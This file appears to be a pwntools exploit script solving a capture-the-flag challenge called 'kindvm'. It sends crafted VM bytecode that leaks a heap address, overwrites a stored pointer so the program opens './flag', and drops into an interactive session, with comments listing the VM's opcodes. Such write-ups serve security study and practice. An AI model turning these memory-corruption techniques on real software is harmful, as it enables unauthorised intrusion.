from pwn import *
context.log_level='debug'
context.arch='amd64'
p=process('./kindvm')
p.sendlineafter(": ","n132")

pay="\x01\x00\xff\xd8\x08\x00"
#load buf-0x28 & out reg[0]===> leak heap
pay+="\x07\x01\x08\x04\x87\x7b"
#set reg[0]=0x0804877b
pay+="\x02\xff\xe4\x01"
#store buf-0x28+0xc
pay+="\x06"
p.sendlineafter(": ",pay)
#do it again
p.readuntil("out] ")
heap=int("0x"+p.readuntil("(")[:-1],16)-0x28
log.warning(hex(heap))

p.sendlineafter(": ","./flag")
#gdb.attach(p,'b *0x80487C0')
off=0x10000-(heap+0x38-0x804b028)
context.endian   = 'big'
pay="\x07\x00{}".format(p32(heap+0x8a0))
#set reg[0]->reg[2]
pay+="\x02\xff\xdc\x00"
#set banner->reg[2]
pay+="\x06"
p.sendlineafter(": ",pay)
p.interactive('n132>')
#[1] load:	opcode(1) reg(1) offset(2)
#[2] store:	opcode(1) offset(2) reg(1)
#[3] move: 	opcode(1) reg(1) reg(1)
#[4] add:	opcode(1) reg(1) reg(1)
#[5] sub:	opcode(1) reg(1) reg(1)
#[6] halt:	opcode(1)
#[7] in:	opcode(1) num(4)
#[8] out:	opcode(1) reg(1)
 	 
